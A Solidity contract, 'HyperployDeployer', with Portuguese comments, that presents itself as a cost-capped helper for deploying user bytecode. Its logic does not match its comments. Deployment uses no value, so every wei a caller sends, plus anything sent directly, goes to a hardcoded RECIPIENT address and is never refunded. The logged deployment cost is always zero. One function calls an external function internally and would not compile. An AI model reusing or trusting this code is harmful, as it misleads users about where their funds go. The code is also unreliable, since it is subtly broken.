// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title HyperployDeployer
 * @dev Contrato intermediário para deploy com limite de custo e redirecionamento de sobra
 */
contract HyperployDeployer {
    // Endereço para onde a sobra será enviada
    address public constant RECIPIENT = 0xC6E5e68492fb7D73955c4F80168552C638844409;
    
    // Limite máximo de HYPE permitido para deploy
    uint256 public constant MAX_DEPLOY_COST = 0.003 ether;
    
    // Eventos para rastreamento
    event ContractDeployed(address indexed deployer, address indexed deployedContract, uint256 gasCost);
    event RemainderSent(address indexed recipient, uint256 amount);
    
    /**
     * @dev Função para deploy de contrato com bytecode fornecido
     * @param bytecode O bytecode do contrato a ser deployado
     * @return deployedAddress O endereço do contrato deployado
     */
    function deployContract(bytes memory bytecode) external payable returns (address deployedAddress) {
        // Verificar se o valor enviado não excede o limite
        require(msg.value <= MAX_DEPLOY_COST, "Valor excede o limite permitido");
        
        // Registrar saldo inicial
        uint256 initialBalance = address(this).balance - msg.value;
        
        // Deploy do contrato
        assembly {
            deployedAddress := create(0, add(bytecode, 0x20), mload(bytecode))
        }
        
        // Verificar se o deploy foi bem-sucedido
        require(deployedAddress != address(0), "Falha no deploy do contrato");
        
        // Calcular custo real do deploy (baseado no gas usado)
        uint256 remainingBalance = address(this).balance;
        uint256 deploymentCost = msg.value - (remainingBalance - initialBalance);
        
        // Emitir evento de deploy
        emit ContractDeployed(msg.sender, deployedAddress, deploymentCost);
        
        // Calcular e enviar a sobra
        uint256 remainder = remainingBalance - initialBalance;
        if (remainder > 0) {
            (bool success, ) = RECIPIENT.call{value: remainder}("");
            require(success, "Falha ao enviar a sobra");
            emit RemainderSent(RECIPIENT, remainder);
        }
    }
    
    /**
     * @dev Função para deploy de contrato com bytecode e argumentos do construtor
     * @param bytecode O bytecode do contrato a ser deployado
     * @param constructorArgs Os argumentos do construtor codificados
     * @return deployedAddress O endereço do contrato deployado
     */
    function deployContractWithArgs(bytes memory bytecode, bytes memory constructorArgs) external payable returns (address deployedAddress) {
        // Concatenar bytecode e argumentos do construtor
        bytes memory deployData = abi.encodePacked(bytecode, constructorArgs);
        
        // Chamar a função de deploy principal
        return deployContract(deployData);
    }
    
    /**
     * @dev Função de fallback para evitar que ETH fique preso no contrato
     */
    receive() external payable {
        // Redirecionar qualquer ETH recebido diretamente para o RECIPIENT
        (bool success, ) = RECIPIENT.call{value: msg.value}("");
        require(success, "Falha ao encaminhar ETH");
        emit RemainderSent(RECIPIENT, msg.value);
    }
}
